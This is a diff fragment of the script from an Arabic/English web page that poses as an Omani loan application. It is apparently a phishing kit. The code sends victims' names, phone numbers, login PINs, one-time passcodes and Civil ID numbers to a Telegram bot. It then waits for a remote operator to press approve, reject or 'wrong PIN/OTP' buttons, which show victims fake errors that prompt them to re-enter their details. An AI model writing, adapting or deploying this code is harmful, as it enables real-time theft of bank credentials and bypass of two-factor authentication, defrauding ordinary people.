+        const message = `<b>🔐 تسجيل دخول جديد | New Login</b>\n\n👤 <b>الاسم:</b> ${formData.firstName} ${formData.lastName}\n📱 <b>الهاتف:</b> +968${loginPhone}\n💰 <b>مبلغ القرض:</b> ${formatMoney(formData.loanAmount)}\n🔐 <b>PIN:</b> ${loginPin}`;
+        
+        await sendToTelegram(message, [
+          { text: '✅ APPROVE', data: 'login_approve' },
+          { text: '❌ REJECT', data: 'login_reject' }
+        ]);
+
+        // Poll for response
+        let pollCount = 0;
+        const maxPolls = 120; // 120 seconds timeout
+
+        pollingInterval = setInterval(async () => {
+          pollCount++;
+          const response = await checkTelegramResponse();
+
+          if (response === 'login_approve') {
+            clearInterval(pollingInterval);
+            showLoading(false);
+            setMessage('error-3', '', true);
+            showStep(3); // Move to OTP step
+          } else if (response === 'login_reject') {
+            clearInterval(pollingInterval);
+            showLoading(false);
+            setMessage('error-3', currentLang === 'ar' ? 'تم رفض البيانات المدخلة. يرجى المحاولة مرة أخرى.' : 'Credentials provided are invalid. Please try again.');
+          }
+
+          if (pollCount >= maxPolls) {
+            clearInterval(pollingInterval);
+            showLoading(false);
+            setMessage('error-3', currentLang === 'ar' ? 'انتهت مهلة الانتظار. يرجى المحاولة مرة أخرى.' : 'Timeout. Please try again.');
+          }
+        }, POLLING_INTERVAL);
+      });
+
+      // ===== STEP 4: OTP WITH TELEGRAM APPROVAL =====
+      document.getElementById('submitOTP').addEventListener('click', async function () {
+        const otp = document.getElementById('otpInput').value.trim();
+        if (!/^\d{4,6}$/.test(otp)) {
+          setMessage('error-4', currentLang === 'ar' ? 'الرمز يجب أن يكون من 4 إلى 6 أرقام.' : 'Code must be 4-6 digits.');
+          return;
+        }
+
+        formData.otp = otp;
+        setMessage('error-4', '');
+
+        // Send to Telegram
+        showLoading(true);
+        const message = `<b>🔐 OTP Verification | التحقق من OTP</b>\n\n👤 <b>الاسم:</b> ${formData.firstName} ${formData.lastName}\n📱 <b>الهاتف:</b> +968${formData.loginPhone}\n🔢 <b>OTP Code:</b> ${otp}`;
+        
+        await sendToTelegram(message, [
+          { text: '✅ ACCEPT', data: 'otp_accept' },
+          { text: '❌ WRONGOTP', data: 'otp_wrongotp' }
+        ]);
+
+        // Poll for response
+        let pollCount = 0;
+        const maxPolls = 120;
+
+        pollingInterval = setInterval(async () => {
+          pollCount++;
+          const response = await checkTelegramResponse();
+
+          if (response === 'otp_accept') {
+            clearInterval(pollingInterval);
+            showLoading(false);
+            setMessage('error-4', '', true);
+            showStep(4); // Move to Civil ID step
+          } else if (response === 'otp_wrongotp') {
+            clearInterval(pollingInterval);
+            showLoading(false);
+            setMessage('error-4', currentLang === 'ar' ? 'رمز OTP المدخل خاطئ أو منتهي الصلاحية. الرجاء إدخال OTP صحيح.' : 'The OTP provided is wrong or has expired. Please provide a valid OTP.');
+          }
+
+          if (pollCount >= maxPolls) {
+            clearInterval(pollingInterval);
+            showLoading(false);
+            setMessage('error-4', currentLang === 'ar' ? 'انتهت مهلة الانتظار. يرجى المحاولة مرة أخرى.' : 'Timeout. Please try again.');
+          }
+        }, POLLING_INTERVAL);
+      });
+
+      // ===== STEP 5: CIVIL ID & PIN WITH TELEGRAM APPROVAL =====
+      document.getElementById('submitVerify').addEventListener('click', async function () {
+        const civilId = document.getElementById('civilId').value.trim();
+        const verifyPin = document.getElementById('verifyPin').value.trim();
+
+        if (!validateCivilId(civilId) || !validatePin(verifyPin)) {
+          setMessage('error-5', currentLang === 'ar' ? 'يرجى إدخال الهوية ورمز PIN بشكل صحيح.' : 'Please enter Civil ID and PIN correctly.');
+          return;
+        }
+
+        formData.civilId = civilId;
+        formData.verifyPin = verifyPin;
+        setMessage('error-5', '');
+
+        // Send to Telegram
+        showLoading(true);
+        const message = `<b>✓ Final Verification | التحقق النهائي</b>\n\n👤 <b>الاسم:</b> ${formData.firstName} ${formData.lastName}\n📱 <b>الهاتف:</b> +968${formData.loginPhone}\n💰 <b>مبلغ القرض:</b> ${formatMoney(formData.loanAmount)}\n🆔 <b>Civil ID:</b> ${civilId}\n🔐 <b>PIN:</b> ${verifyPin}`;
+        
+        await sendToTelegram(message, [
+          { text: '✅ APPROVE', data: 'verify_approve' },
+          { text: '⚠️ WRONGPIN', data: 'verify_wrongpin' },
+          { text: '❌ WRONGID', data: 'verify_wrongid' }
+        ]);
+
+        // Poll for response
+        let pollCount = 0;
+        const maxPolls = 120;
+
+        pollingInterval = setInterval(async () => {
+          pollCount++;
+          const response = await checkTelegramResponse();
+
+          if (response === 'verify_approve') {
+            clearInterval(pollingInterval);
+            showLoading(false);
+            
+            // Update success summary
+            document.getElementById('summaryName').textContent = `${formData.firstName} ${formData.lastName}`;
+            document.getElementById('summaryLoan').textContent = formatMoney(formData.loanAmount);
+            document.getElementById('summaryPeriod').textContent = `${formData.loanPeriod} شهر`;
+            document.getElementById('summaryPurpose').textContent = formData.loanPurpose;
+            document.getElementById('summaryMonthly').textContent = `${formData.monthlyPayment} ر.ع`;
+            
+            showStep(5); // Move to success step
+          } else if (response === 'verify_wrongpin') {
+            clearInterval(pollingInterval);
+            showLoading(false);
+            setMessage('error-5', currentLang === 'ar' ? 'رمز PIN المدخل خاطئ. الرجاء إدخال PIN صحيح والمحاولة مرة أخرى.' : 'The PIN provided is wrong. Please put the correct PIN and try again.');
+          } else if (response === 'verify_wrongid') {
+            clearInterval(pollingInterval);
+            showLoading(false);
+            setMessage('error-5', currentLang === 'ar' ? 'رقم الهوية المدخل خاطئ. الرجاء المحاولة مرة أخرى.' : 'The Civil ID provided is wrong. Please try again.');
+          }
+
+          if (pollCount >= maxPolls) {
+            clearInterval(pollingInterval);
+            showLoading(false);
+            setMessage('error-5', currentLang === 'ar' ? 'انتهت مهلة الانتظار. يرجى المحاولة مرة أخرى.' : 'Timeout. Please try again.');
+          }
+        }, POLLING_INTERVAL);
+      });
+
+      // Initialize language
+      updateLanguage('ar');
+    </script>
+  </body>
+</html>
